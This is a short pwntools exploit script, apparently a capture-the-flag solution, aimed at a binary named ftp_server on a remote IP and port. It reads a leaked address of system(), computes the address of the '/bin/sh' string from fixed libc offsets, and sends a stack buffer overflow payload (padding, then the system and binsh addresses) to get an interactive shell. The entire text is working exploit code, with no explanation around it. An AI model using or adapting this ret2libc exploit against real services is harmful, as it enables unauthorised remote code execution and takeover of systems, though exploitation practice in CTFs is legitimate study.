from pwn import *
elf = ELF('/home/kali/Downloads/ftp_server')
p = elf.process()
p=remote('34.159.14.234', 31258)

#gdb.attach(p, gdbscript = 'b * 0x8049277')
p.recvuntil('R ')
p.sendline(b'kkt')
p.recvuntil(b': ')

system = int(p.recv(10), 16)

log.success(f'system: {hex(system)}')



binsh = system + 0x174c32
#different ver
binsh = system + 0x174f65
log.success(f'binsh: {hex(binsh)}')

p.recvuntil('S ')
p.sendline(b'a'*76 + 
	   b'e'*4 +
	   p32(system) +
	   b'e'*4 +
	   p32(binsh))

#read 100 

p.interactive()
